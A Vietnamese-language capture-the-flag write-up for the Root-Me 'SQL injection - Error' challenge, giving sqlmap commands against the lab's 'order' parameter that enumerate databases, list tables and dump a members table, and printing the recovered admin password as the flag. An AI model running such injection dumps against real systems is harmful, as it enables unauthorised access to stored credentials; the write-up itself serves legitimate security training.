---
template: overrides/blog.html
icon: material/plus-circle
title: SQL injection - Error
description: >
  
search:
  exclude: true
hide:
  - feedback

tags:
  - SQL Injection 
---

# __SQL injection - Error__

<span>
:octicons-calendar-24: May 03, 2023

</span>

---


## __Tài nguyên và link challenge__

Tài nguyên của challenge này tại [https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Error](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Error)

Link challenge này tại [:octicons-arrow-right-24: http://challenge01.root-me.org/web-serveur/ch34/][http://challenge01.root-me.org/web-serveur/ch34/]

  [http://challenge01.root-me.org/web-serveur/ch34/]: http://challenge01.root-me.org/web-serveur/ch34/

## __Tổng quan__

Trong challenge này, mục tiêu của ta là lấy mật khẩu admin

## __Kịch bản tấn công__
### Bước 1: Kiểm tra website

Challenge này cung cấp cho ta 2 website: 1 cho việc login tài khoản, 1 cho việc xem các bản record (trang Contents)

Sau một số phép kiểm tra, ta thấy được trang này bị lỗi ở HTTP GET METHOD trang Contents

<figure markdown>
  ![Image title](/rootme/web-server/sql-injection/images/sql-injection-error-02.png#zoom)
  <figcaption>Hình ảnh mô tả kết quả câu lệnh</figcaption>
</figure>

### Bước 2: Khai thác website

Rồi, bài này ta dùng sqlmap[^1] thôi ::)
Dùng `python sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" --dbs` để tìm số lượng database truy cập được.

<figure markdown>
  ![Image title](/rootme/web-server/sql-injection/images/sql-injection-error-01.png#zoom)
  <figcaption>Hình ảnh mô tả kết quả câu lệnh</figcaption>
</figure>

Well, database public là thứ ta mong chờ.

Tiếp theo, ta lấy các table trên database public bằng `python sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" -D public --tables`

<figure markdown>
  ![Image title](/rootme/web-server/sql-injection/images/sql-injection-error-03.png#zoom)
  <figcaption>Hình ảnh mô tả kết quả câu lệnh</figcaption>
</figure>

Ta thấy được table `m3mbr35t4bl3` có vẻ đáng nghi. Tiếp tục ta dump dữ liệu trong table này bằng `python sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" -D public -T m3mbr35t4bl3 --dump`

<figure markdown>
  ![Image title](/rootme/web-server/sql-injection/images/sql-injection-error-04.png#zoom)
  <figcaption>Hình ảnh mô tả kết quả câu lệnh</figcaption>
</figure>

Well, gì đây? Password đây rồi :v

???+ question "Chậm lại và suy nghĩ"

    Còn cách khai thác lỗi nào khác ngoại trừ việc dùng sqlmap không?

??? success "Giải quyết chậm lại suy nghĩ"

    Dựa vào thông báo lỗi được xuất ra màn hình với query thử nghiệm ở [hình 1](/rootme/web-server/sql-injection/images/sql-injection-error-02.png#zoom) ta có thể khai thác theo dạng sql blind.

!!! success "__Flag__"
    1a2BdKT5DIx3qxQN3UaC

 [^1] Xem hướng dẫn cài đặt sqlmap tại https://sqlmap.org/